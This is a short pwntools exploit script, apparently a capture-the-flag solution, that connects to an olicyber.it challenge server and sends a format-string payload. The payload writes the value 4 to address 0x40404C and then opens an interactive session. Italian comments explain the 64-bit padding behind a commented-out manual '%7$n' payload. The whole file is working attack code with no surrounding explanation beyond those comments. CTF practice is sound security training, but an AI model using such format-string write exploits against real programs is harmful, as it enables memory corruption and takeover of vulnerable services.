from pwn import *

p = remote('formatted.challs.olicyber.it', 10305)
p.recvuntil(b'name?')
# aggiungiamo le 4 a perche in architettura 64bit bisogna occupare 8 byte
# percio i 4 del %7$n e i 4 delle a cosi l indirizzo puo stare 'da solo' sull 7th %p
#payload =  b'a'*4 + b'%7$n' + p64(0x40404C)  
payload =  fmtstr_payload(7,{ 0x40404C: p32(4)})
print(payload)
p.sendline(payload)
p.interactive()